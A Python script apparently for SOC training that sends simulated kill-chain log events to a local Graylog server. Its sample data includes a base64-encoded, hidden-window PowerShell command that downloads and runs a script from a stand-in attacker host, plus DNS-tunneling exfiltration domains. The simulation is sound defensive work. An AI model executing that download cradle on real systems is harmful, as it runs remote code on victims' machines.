import socket
import json
import time
import uuid
from datetime import datetime

# Graylog Configuration
GRAYLOG_IP = "127.0.0.1"
GRAYLOG_PORT = 12201

def send_gelf(payload):
    """Sends a GELF message over UDP."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            message = json.dumps(payload).encode('utf-8')
            sock.sendto(message, (GRAYLOG_IP, GRAYLOG_PORT))
        print(f"[+] Sent: {payload['short_message']} (Level: {payload['level']})")
    except Exception as e:
        print(f"[!] Error sending log: {e}")

def generate_event(short_msg, level, event_type, severity, username, source_ip, details=""):
    """Creates a GELF 1.1 compliant payload with custom fields."""
    return {
        "version": "1.1",
        "host": "SOC-Demo-Client",
        "short_message": short_msg,
        "full_message": details,
        "timestamp": datetime.utcnow().timestamp(),
        "level": level,  # 0=Emergency, 1=Alert, 2=Critical, 3=Error, 4=Warning, 5=Notice, 6=Info, 7=Debug
        "_app_name": "AttackSimulator_V2",
        "_event_type": event_type,
        "_severity": severity,
        "_username": username,
        "_source_ip": source_ip,
        "_session_id": str(uuid.uuid4())
    }

def run_simulation():
    print(f"=== Starting SOC Attack Simulation Kill-Chain ===")
    print(f"Target Graylog: {GRAYLOG_IP}:{GRAYLOG_PORT}\n")

    # --- STAGE 1: Execution (MITRE T1059.001) ---
    print(">>> STAGE 1: Execution")
    event = generate_event(
        short_msg="Suspicious PowerShell Execution",
        level=4, 
        event_type="PROCESS_CREATION",
        severity="WARNING",
        username="john_doe",
        source_ip="192.168.1.50",
        details="powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYmFkLWFjdG9yLmNvbS9wYXlsb2FkLnBzMScp"
    )
    send_gelf(event)
    time.sleep(3)

    # --- STAGE 2: Lateral Movement (MITRE T1021.004) ---
    print("\n>>> STAGE 2: Lateral Movement")
    for i in range(5):
        event = generate_event(
            short_msg=f"Failed SSH Login Attempt ({i+1}/5)",
            level=3,
            event_type="SSH_LOGIN_FAILURE",
            severity="ERROR",
            username="root",
            source_ip="192.168.1.50",
            details="Invalid password for user root from 192.168.1.50 port 52342 ssh2"
        )
        send_gelf(event)
        time.sleep(1)
    
    event = generate_event(
        short_msg="Successful SSH Login (Brute Force Success)",
        level=2,
        event_type="SSH_LOGIN_SUCCESS",
        severity="CRITICAL",
        username="root",
        source_ip="192.168.1.50",
        details="Accepted password for root from 192.168.1.50 port 52344 ssh2"
    )
    send_gelf(event)
    time.sleep(4)

    # --- STAGE 3: Data Exfiltration (MITRE T1048.003) ---
    print("\n>>> STAGE 3: Data Exfiltration")
    for i in range(3):
        domain = f"part{i+1}.data-exfil-segment.attacker-dns.com"
        event = generate_event(
            short_msg="Suspicious DNS Tunneling Query",
            level=3,
            event_type="DNS_QUERY",
            severity="HIGH",
            username="system",
            source_ip="10.0.0.5",
            details=f"Query type A for domain: {domain}"
        )
        send_gelf(event)
        time.sleep(2)

    # --- STAGE 4: Ransomware (MITRE T1486) ---
    print("\n>>> STAGE 4: Ransomware Impact")
    files = ["financials.xlsx", "client_database.db", "legal_docs.pdf", "backup_config.xml"]
    for file_name in files:
        event = generate_event(
            short_msg=f"File Encryption Detected: {file_name}",
            level=1, # Alert/Critical
            event_type="RANSOMWARE_ENCRYPTION",
            severity="CRITICAL",
            username="admin_svc",
            source_ip="10.0.0.5",
            details=f"Process encryptor.exe modified {file_name} -> {file_name}.locked"
        )
        send_gelf(event)
        time.sleep(1.5)

    print("\n=== Simulation Complete. Check Graylog for logs! ===")

if __name__ == "__main__":
    run_simulation()
